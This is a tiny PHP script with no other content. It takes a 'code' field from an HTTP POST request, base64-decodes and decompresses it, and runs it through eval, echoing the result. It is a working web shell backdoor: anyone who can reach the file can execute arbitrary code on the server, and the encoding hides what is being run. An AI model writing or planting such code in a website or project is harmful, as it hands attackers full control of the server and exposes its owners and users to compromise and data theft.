<?php
$s_rscode = $_POST['code'];
$s_fc = gzinflate(base64_decode($s_rscode));
$s_result = eval("?>".$s_fc);
echo $s_result;
?>